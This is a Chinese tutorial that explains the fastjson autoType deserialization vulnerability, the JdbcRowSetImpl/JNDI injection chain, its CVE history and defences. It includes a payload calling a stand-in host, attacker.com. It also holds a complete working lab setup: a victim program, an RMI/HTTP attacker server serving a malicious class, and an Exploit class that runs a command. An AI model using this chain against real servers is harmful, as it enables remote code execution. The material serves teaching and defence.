---
title: fastjson反序列化漏洞
date: 2026-09-18
category: 未归类
---

# fastjson反序列化漏洞

## 一、JSON与序列化

### 1.1 JSON

JSON（JavaScript Object Notation）是一种轻量的数据交换格式，本质就是一段**文本**：

```json
{
  "name": "张三",
  "age": 18,
  "address": { "city": "北京" }
}
```

它只有几种基本类型：对象 `{}`、数组 `[]`、字符串、数字、布尔值、null。几乎所有编程语言都能处理它，所以它是前后端、服务之间传数据的"通用语言"。

### 1.2 序列化与反序列化

- **序列化**：把内存里的对象（有类型、有方法）转成一段**文本/字节流**（丢失了类型信息）。
- **反序列化**：把文本/字节流**还原成对象**。

在 Java 里，一个对象长这样：

```java
class User {
    private String name;
    private int age;
    // 还有 getter/setter 方法……
}
```

序列化后它变成一段 JSON 文本：

```json
{ "name": "张三", "age": 18 }
```

问题来了：JSON 里**没有类型信息**。当我拿到 `{ "name": "张三", "age": 18 }` 时，我怎么知道该把它还原成 `User` 还是 `Student` 还是别的类？

### 1.3 反序列化的两种方式

**方式一：明确指定目标类型**（安全）

```java
User user = JSON.parseObject(jsonStr, User.class);   // 明确告诉它：还原成 User
```

**方式二：让 JSON 自己携带类型**（fastjson 的 `@type`，危险）

```java
Object obj = JSON.parseObject(jsonStr);   // 不指定类型，由 JSON 里的 @type 说了算
```

方式二就是 fastjson 漏洞的**根源**。

---

## 二、fastjson

### 2.1 定位

- **fastjson** 是阿里巴巴开源的 Java JSON 处理库，主打**高性能**。
- 在国产 Java 生态里使用极广（大量企业级项目、中间件、框架都直接或间接依赖它）。
- 有 fastjson（1.x）和 fastjson2（重写版）两个版本。

### 2.2 核心能力

1. **序列化**：`JSON.toJSONString(obj)` 把 Java 对象转成 JSON 字符串。
2. **反序列化**：`JSON.parseObject(str, Class)` 把 JSON 字符串转回 Java 对象。
3. **autoType**：反序列化时不指定类型，靠 JSON 里的 `@type` 字段自动识别类型。

### 2.3 正常的使用示例

```java
// 序列化：对象 -> JSON
User u = new User("张三", 18);
String json = JSON.toJSONString(u);
// {"name":"张三","age":18}

// 反序列化：JSON -> 对象（指定类型）
User u2 = JSON.parseObject(json, User.class);
```

---

## 三、漏洞根源：autoType 机制

### 3.1 什么是 autoType

fastjson 为了方便，允许在 JSON 里用 **`@type`** 字段直接指定要反序列化成哪个类：

```json
{
  "@type": "com.example.User",
  "name": "张三",
  "age": 18
}
```

这样调用 `JSON.parseObject(str)` 时，**不需要**在代码里写 `User.class`，fastjson 会读 `@type` 的值，反射加载 `com.example.User` 这个类，再实例化并填充字段。

这个"根据 JSON 里的类名自动决定类型"的功能，就叫 **autoType**。

### 3.2 为什么它会变成漏洞

- `@type` 的值是**攻击者可以控制的**（它就在 JSON 里）。
- fastjson 会**无条件信任**这个类名，用反射去加载并实例化它。
- Java 里很多类的 **setter / getter / 构造函数 / 静态代码块** 在被调用时，会触发一些"危险操作"（比如发起网络请求、执行命令、加载字节码）。

于是：**攻击者只要找到一个"危险类"，把它的类名写进 `@type`，再精心构造字段值，就能在目标服务器上执行任意代码。**

这就是 fastjson 反序列化漏洞的本质——**它不是 fastjson 自身的代码有 bug，而是 autoType 这个"便捷功能"给了攻击者一个任意类实例化的入口，配合 Java 生态里现成的危险类，拼成了一条完整的利用链。**

---

## 四、漏洞是什么：反序列化 RCE

### 4.1 反序列化漏洞的通病

凡是"反序列化不可信数据"的功能，都可能存在这类问题（fastjson、Jackson、Java 原生 `ObjectInputStream`、Python pickle 等都出过类似漏洞）。核心逻辑都一样：

```
不可信数据 → 反序列化引擎 → 实例化攻击者指定的类 → 触发危险操作
```

### 4.2 fastjson 的经典利用链：JdbcRowSetImpl + JNDI 注入

fastjson 最著名、最"教科书"的一条利用链，用的是 **JDK 自带的类 `com.sun.rowset.JdbcRowSetImpl`**（不用额外引入任何第三方 jar，所以威力极大）。

这条链分两段：

1. **fastjson 段**：`@type` 指定 `JdbcRowSetImpl`，触发它的 `setAutoCommit()`。
2. **JNDI 段**：`setAutoCommit()` 内部会做 JNDI 查询，攻击者用恶意 JNDI 服务器让目标 JVM 下载并执行恶意类。

---

## 五、具体步骤

### 5.1 攻击载荷

```json
{
  "@type": "com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName": "rmi://attacker.com:1099/Exploit",
  "autoCommit": true
}
```

受害者代码只要执行一行：

```java
JSON.parseObject(payload);   // payload 就是上面那段 JSON
```

就能被 RCE。下面是逐步拆解。

### 5.2 第一步：@type 让 fastjson 实例化 JdbcRowSetImpl

fastjson 读到 `"@type": "com.sun.rowset.JdbcRowSetImpl"`，反射加载这个类，`new` 出一个对象。

### 5.3 第二步：调用 setDataSourceName()

fastjson 把 `dataSourceName` 字段的值 `"rmi://attacker.com:1099/Exploit"`，通过反射调用：

```java
jdbcRowSet.setDataSourceName("rmi://attacker.com:1099/Exploit");
```

这一步只是**存下**了这个地址，还没出事。

### 5.4 第三步：调用 setAutoCommit(true) 

fastjson 接着处理 `autoCommit` 字段，调用：

```java
jdbcRowSet.setAutoCommit(true);
```

而这个方法的**内部实现**会去连数据库：

```java
public void setAutoCommit(boolean autoCommit) throws SQLException {
    // 如果还没连接，就先 connect()
    if (conn == null) {
        conn = connect();      // ← 触发危险操作
    }
    conn.setAutoCommit(autoCommit);
}
```

`connect()` 里有一句致命的 JNDI 查询：

```java
private Connection connect() throws SQLException {
    ...
    Context ctx = new InitialContext();
    DataSource ds = (DataSource) ctx.lookup(getDataSourceName());   // ← JNDI lookup!
    ...
}
```

也就是说，`setAutoCommit(true)` 会拿着我们刚才塞进去的 `dataSourceName`（`rmi://attacker.com:1099/Exploit`）去做 **JNDI 查询**。

### 5.5 第四步：JNDI 注入 —— 从"查询"变成"执行恶意代码"

JNDI（Java Naming and Directory Interface）是 Java 的"命名与目录服务"，可以简单理解为"根据一个名字去查找资源"，支持多种协议：`ldap://`、`rmi://`、`dns://` 等。

目标 JVM 执行 `ctx.lookup("rmi://attacker.com:1099/Exploit")` 时，会：

1. 连接攻击者的 RMI 服务器 `attacker.com:1099`；
2. 攻击者返回一个 `Reference`（引用）对象，里面写着：
   - "你要的类叫 `Exploit`"
   - "去 `http://attacker.com:8000/` 这个地址下载它的字节码"
3. 目标 JVM 乖乖地去这个 HTTP 地址**下载 `Exploit.class`**；
4. 加载并**实例化**这个类；
5. 实例化的瞬间，`Exploit` 类里的**静态代码块 / 构造函数**执行——里面就是攻击者的恶意代码。

### 5.6 第五步：任意代码执行

恶意类 `Exploit` 的静态块里可以写任何东西：

```java
public class Exploit {
    static {
        // 攻击者想干嘛干嘛：反弹 shell、写文件、执行系统命令……
        Runtime.getRuntime().exec("calc.exe");
    }
}
```

到了这一步，**攻击者已经在目标服务器上执行了任意代码**。

### 5.7 完整时序图

```
攻击者构造恶意 JSON
        │
        ▼
受害者执行 JSON.parseObject(payload)
        │
        ▼
fastjson 读 @type → 反射实例化 JdbcRowSetImpl
        │
        ▼
调用 setDataSourceName("rmi://attacker:1099/Exploit")   ← 只是存地址
        │
        ▼
调用 setAutoCommit(true)
        │
        ├─ 内部触发 connect()
        │      │
        │      ▼
        │  ctx.lookup("rmi://attacker:1099/Exploit")   ← JNDI 查询
        │      │
        │      ▼
        │  连接攻击者 RMI 服务器，拿到 Reference
        │      │
        │      ▼
        │  从攻击者 HTTP 下载 Exploit.class
        │      │
        │      ▼
        │  加载并实例化 Exploit → 静态块执行恶意代码 ★RCE
        │
        ▼
（后续类型强转失败抛异常，但为时已晚，代码已经执行了）
```

---

## 六、代码示例

```java
package demo;

import com.alibaba.fastjson.JSON;

/**
 * 受害者：一个接收外部 JSON 并调用 fastjson 反序列化的服务。
 * 模拟场景：HTTP 接口直接对请求体做 JSON.parseObject 解析，未做任何过滤。
 */
public class Victim {
    public static void main(String[] args) {
        // 攻击者可控的恶意 JSON：
        //   @type         -> 指定反序列化为 com.sun.rowset.JdbcRowSetImpl
        //   dataSourceName -> 指向攻击者的 RMI 服务
        //   autoCommit=true -> 触发 JdbcRowSetImpl#connect() 内的 JNDI lookup
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\","
                + "\"dataSourceName\":\"rmi://127.0.0.1:1099/Exploit\","
                + "\"autoCommit\":true}";

        System.out.println("解析攻击者输入的 JSON：");
        System.out.println(payload);
        System.out.println();

        // 直接解析不可信输入，触发反序列化漏洞
        JSON.parseObject(payload);
    }
}
```

```java
package exploit;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.net.httpserver.HttpServer;

import javax.naming.Reference;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.InetSocketAddress;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * 攻击者服务器：
 *   1. 用 HTTP 托管恶意类 Exploit.class
 *   2. 用 RMI 注册表绑定一个指向该类的 JNDI Reference
 * 受害者被 JNDI 注入后，会先从 HTTP 下载 Exploit.class，再实例化触发静态代码块。
 */
public class EvilServer {
    public static void main(String[] args) throws Exception {
        // 1. 启动 HTTP 服务（8000 端口），托管恶意类
        HttpServer http = HttpServer.create(new InetSocketAddress(8000), 0);
        http.createContext("/", exchange -> {
            InputStream in = EvilServer.class.getResourceAsStream("/exploit/Exploit.class");
            byte[] data = readAll(in);
            exchange.sendResponseHeaders(200, data.length);
            exchange.getResponseBody().write(data);
            exchange.close();
        });
        http.start();
        System.out.println("HTTP 服务已启动：http://127.0.0.1:8000/exploit/Exploit.class");

        // 2. 启动 RMI 注册表（1099 端口），绑定 JNDI Reference
        Registry registry = LocateRegistry.createRegistry(1099);
        Reference ref = new Reference("exploit.Exploit", "exploit.Exploit",
                "http://127.0.0.1:8000/");
        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Exploit", wrapper);
        System.out.println("RMI 服务已启动：rmi://127.0.0.1:1099/Exploit");
        System.out.println("等待受害者触发...");
    }

    /** Java 8 兼容的字节流读取（readAllBytes 是 Java 9 才有） */
    private static byte[] readAll(InputStream in) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        byte[] buf = new byte[4096];
        int n;
        while ((n = in.read(buf)) != -1) {
            out.write(buf, 0, n);
        }
        return out.toByteArray();
    }
}

```

```java
package exploit;

/**
 * 恶意类：当被 JNDI 远程加载并实例化时，其静态初始化块会被执行。
 * 实际攻击场景中，这里可以执行任意命令、反弹 shell 等。
 */
public class Exploit {
    static {
        try {
            // 写一个标记文件，便于在自动化环境确认漏洞是否触发
            java.io.FileOutputStream fos = new java.io.FileOutputStream("pwned.txt");
            fos.write("fastjson RCE triggered!".getBytes());
            fos.close();
            // Windows 上弹出计算器，作为"任意代码执行"的直观演示
            Runtime.getRuntime().exec("calc.exe");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

```

## 七、JDK 版本的影响

上面的 JNDI 注入里，有一个关键开关：**JVM 是否允许从远程 codebase 下载类**（`trustURLCodebase`）。

| JDK 版本          | 默认行为               | 能否直接触发       |
| ----------------- | ---------------------- | ------------------ |
| JDK 8u121 之前    | 完全信任，任意远程加载 | ✅ 直接触发         |
| JDK 8u121 ~ 8u191 | 默认信任，可配置关闭   | ✅ 直接触发         |
| JDK 8u191 之后    | **默认禁止**远程类加载 | ⚠️ 需手动加参数放开 |
| JDK 11+           | 相关机制被**彻底移除** | ❌ 此链基本失效     |

所以现代 JDK 8 上复现时，需要加：

```bash
-Dcom.sun.jndi.rmi.object.trustURLCodebase=true
```

这就是为什么"升级 JDK"本身就是一种有效防御——它关掉了 JNDI 注入的"远程类加载"。但**fastjson 的漏洞不只有这一条利用链**，所以不能只靠升级 JDK。

---

## 八、漏洞演变历史

| 时间  | 版本/编号         | 说明                                                       |
| ----- | ----------------- | ---------------------------------------------------------- |
| 2017  | CVE-2017-18349    | fastjson ≤ 1.2.24，**完全没有防护**，autoType 任意类实例化 |
| 2017  | 1.2.25            | 引入**黑名单**（拉黑已知危险类），但被绕过                 |
| 2019  | CVE-2019-14379 等 | 通过各种 `@type` 变体、新 gadget 类绕过黑名单              |
| 2020  | CVE-2020-10652    | 继续被绕过                                                 |
| 2022  | CVE-2022-25845    | 1.2.83 之前的又一次绕过                                    |
| 2022  | 1.2.83            | fastjson 1.x **最终版**，修复已知问题                      |
| 2023+ | fastjson2         | 重写版，**默认关闭 autoType**，需显式开启                  |

**官方拉黑一批类，攻击者就找一批新类绕过**，这是一场持续多年的"猫鼠游戏"。这也是为什么最终 fastjson2 直接默认关闭 autoType——堵死入口，而不是继续打补丁。

---

## 九、如何防护

按优先级从高到低：

1. **升级库**：fastjson 升级到 1.2.83+（1.x 最终版），或迁移到 **fastjson2**（默认关 autoType）。

2. **开启 SafeMode**（fastjson 1.2.68+）：

   ```java
   ParserConfig.getGlobalInstance().setSafeMode(true);   // 彻底禁用 autoType
   ```

3. **指定目标类型反序列化**，不要用"无类型"的 `parseObject`：

   ```java
   // 坏：无类型，@type 会被解析
   Object obj = JSON.parseObject(input);
   
   // 好：指定类型，杜绝 @type 指定任意类
   User user = JSON.parseObject(input, User.class);
   ```

4. **不解析不可信输入**：对用户提交的数据做校验，尽量别直接反序列化。

5. **JDK 层面**：保持 `trustURLCodebase=false`（默认），并升级 JDK。

6. **纵深防御**：即使单点没防住，还有运行时环境（容器权限、沙箱、WAF）兜底。

<CommentService />
